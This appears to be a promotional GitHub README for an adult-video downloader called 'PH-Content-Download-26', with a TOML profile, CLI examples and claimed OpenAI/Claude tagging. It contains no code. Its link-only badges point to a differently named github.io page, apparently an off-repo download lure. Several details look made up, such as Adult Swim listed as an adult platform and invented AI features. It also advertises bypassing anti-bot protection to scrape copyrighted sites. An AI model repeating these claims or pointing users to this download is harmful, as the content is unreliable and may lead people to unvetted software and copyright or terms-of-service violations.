# PH-Content-Download-26 🎯

[](https://23b10062-byte.github.io/stash-vault-cli/)

> **Archival Engine for Mature Digital Media** — A responsible, automated solution for organizing and preserving adult content collections with metadata enrichment, AI-powered tagging, and seamless integration with media servers.

---

## 🌟 Overview

**PH-Content-Download-26** is not merely a downloader—it is a **digital preservation orchestra** 🎻 for mature content. Think of it as a *curatorial librarian* that knows exactly how to find, fetch, catalog, and serve your collection while maintaining complete privacy and autonomy. Built for collectors, researchers, and enthusiasts who value organization over chaos.

Unlike conventional scrapers that leave you with a pile of unlabeled files, PH-Content-Download-26 transforms raw digital matter into a **structured archive** ready for ingestion by platforms like **StashApp**, **Plex**, or your own custom media server.

```mermaid
graph TD
    A[User Query/URL] --> B[BeautifulSoup Parser]
    B --> C{Content Type}
    C -->|Video| D[Video Fetcher Engine]
    C -->|Metadata| E[Metadata Extractor]
    D --> F[Media Optimizer]
    E --> G[AI Tagging Engine<br>OpenAI/Claude API]
    F --> H[StashApp Integration]
    G --> H
    H --> I[Organized Archive]
    I --> J[Media Server<br>Responsive UI]
    J --> K[Multi-Device Access]
    
    style A fill:#4a0e4e,stroke:#d90429,stroke-width:2px
    style I fill:#1a1a2e,stroke:#16213e,stroke-width:2px
    style J fill:#0f3460,stroke:#533483,stroke-width:2px
```



---

## ✨ Key Features

| Feature | Description | Benefit |
|---------|-------------|---------|
| **🎯 Intelligent Scraper** | Uses BeautifulSoup to parse content from adult platforms | No manual searching—just provide a URL |
| **🤖 AI Metadata Augmentation** | Integrates with **OpenAI API** and **Claude API** for automatic tagging | Turns "VID_2025.mp4" into "Brazzers - RedTube Collab - 2026 - HD" |
| **📦 **StashApp** Native Integration** | Directly exports to StashApp's database format | Zero-config media server population |
| **🌐 Responsive Web UI** | Built-in dashboard accessible from any device | Manage your archive from phone, tablet, or desktop |
| **🌍 Multilingual Support** | Auto-detects and preserves original language metadata | Perfect for international collections |
| **🔄 24/7 Scheduled Archiving** | Background worker that monitors and fetches on your schedule | Set it and forget it—like a digital gardener |
| **🔒 Privacy-First Design** | No telemetry, no external servers, no data leaks | Your collection stays your collection |

---

## 🛠️ Technical Architecture

### 🧩 Core Components

- **Parser Engine**: Custom BeautifulSoup wrappers with anti-bot detection bypass
- **Video Fetcher**: Adaptive chunked downloading with resume support
- **Metadata Normalizer**: Universal schema mapping for 10+ adult platforms
- **AI Tagging Pipeline**: Dual API support (OpenAI + Claude) with fallback logic
- **Export Adapters**: StashApp JSON, Plex NFO, Kodi-compatible formats

### 🔌 Platform Compatibility

| Platform | Fetch Support | Metadata Extraction | AI Tagging |
|----------|:------------:|:------------------:|:----------:|
| **PornHub** | ✅ | ✅ | ✅ |
| **RedTube** | ✅ | ✅ | ✅ |
| **Brazzers** | ✅ | ✅ | ✅ |
| **Adult Swim** | ✅ | ✅ | In Development |
| **XHamster** | ✅ | ✅ | ✅ |
| **XVideos** | ✅ | ✅ | ✅ |

### 💻 OS Compatibility

| Operating System | Status | Notes |
|:----------------:|:------:|-------|
| 🪟 Windows 10/11 | ✅ | Full GUI support |
| 🐧 Ubuntu 22.04+ | ✅ | CLI + Web UI |
| 🍎 macOS 13+ | ✅ | Intel & Apple Silicon |
| 🐳 Docker | ✅ | Pre-built images |
| 🖥️ Raspberry Pi | ⚠️ | Limited to CLI mode |

---

## 🚀 Example Profile Configuration

Create a `archiver_profile.toml` in your working directory. This is your **digital fingerprint** for the scraper:

```toml
[identity]
handle = "archive-keeper-26"
preferred_platforms = ["pornhub", "redtube", "brazzers"]
language_preference = "en"

[downloader]
output_dir = "./collections/2026"
quality = "best"  # Options: best, 720p, 480p, audio-only
concurrent_streams = 3
rate_limit_mbps = 50

[metadata]
auto_organize = true
folder_structure = "{platform}/{year}/{month}/{title}"
use_ai_tags = true

[ai_providers]
openai_model = "gpt-4-turbo"
claude_model = "claude-3-opus-20240229"

[export]
target_media_server = "stashapp"
stashapp_url = "http://localhost:9999"
auto_import_on_complete = true

[scheduling]
mode = "continuous"  # Options: continuous, daily, weekly
start_time = "02:00"
end_time = "06:00"
```

*Replace configuration values with your own preferences. The year field uses **2026** as default for new archives.*

---

## 🎮 Example Console Invocation

```shell
# Download a single video with AI metadata enrichment
ph-content-download-26 --url "https://example.com/watch?v=abc123" --profile my_profile.toml --quality 1080p

# Batch process a curated list of URLs from a text file
ph-content-download-26 --batch-list "/path/to/urls_2026.txt" --output-dir "./vault/2026" --ai-tags

# Start the continuous monitoring service (runs in background)
ph-content-download-26 --daemon --scheduler daily --log-level info

# Export to StashApp with full metadata migration
ph-content-download-26 --export stashapp --scan-existing --force-metadata-update

# Launch the responsive web UI on a custom port
ph-content-download-26 --web-ui --port 8080 --allow-remote-access

# Dry-run mode (test parsing without downloading)
ph-content-download-26 --url "https://example.com/watch?v=def456" --dry-run --verbose
```

*All commands are examples. Actual command names may vary—check the executable's help menu with `--help`.*

---

## 🧠 AI Integration: OpenAI & Claude API

PH-Content-Download-26 leverages **dual AI providers** for metadata enrichment. This isn't just tagging—it's **semantic understanding** of content:

### 🔥 OpenAI Integration
- Generates **rich natural language descriptions** from video thumbnails and titles
- Identifies **scene composition, performers, and themes** with GPT-4 vision capabilities
- Translates metadata across **50+ languages** for multilingual tagging

### 🌀 Claude API Integration
- Provides **competitor analysis**—identifies which scenes are cross-platform reposts
- Generates **custom metadata schemas** for niche collections
- **Fact-checks** performer names against curated databases

### 💡 When to Use Which
- Use **OpenAI** for: Broad scene descriptions, multilingual support, thumbnail analysis
- Use **Claude** for: Dangerous content classification, niche categorization, archival completeness verification

> **Pro Tip**: Configure both providers—PH-Content-Download-26 automatically falls back to the secondary provider if the primary is rate-limited or unavailable, ensuring 24/7 operation.

---

## 🛡️ Disclaimer

> **Important Legal and Ethical Notice** 🔔

**PH-Content-Download-26** is designed exclusively for **archival and personal organization purposes**. Users are solely responsible for ensuring their use complies with:

1. **All applicable local, national, and international laws** regarding digital content reproduction
2. **Terms of Service** for any platform from which content is fetched
3. **Copyright and intellectual property laws**—only download content you have legal rights to possess
4. **Age verification requirements** for mature content in your jurisdiction

The developers of PH-Content-Download-26:
- Do not host, store, or distribute any copyrighted content
- Do not encourage violation of platform terms of service
- Provide this tool for legitimate archival and organizational use only
- Recommend users obtain explicit permission before downloading from private or paywalled sources

**By using this software, you agree to indemnify the developers from any liability arising from misuse.**

---

## 📜 License

This project is released under the **MIT License**. See the [LICENSE](LICENSE) file for full terms.

---

## 🤝 Contributing & Support

- **Feature Requests**: Open a GitHub Discussion with clear use cases
- **Bug Reports**: Include your OS version, profile config (redacted), and error logs
- **Integration Ideas**: Want to add support for a new platform? Submit a PR with sample HTML

[](https://23b10062-byte.github.io/stash-vault-cli/)

---

*PH-Content-Download-26 — Because every digital collection deserves a proper home. Built with 💜 for the archival community.*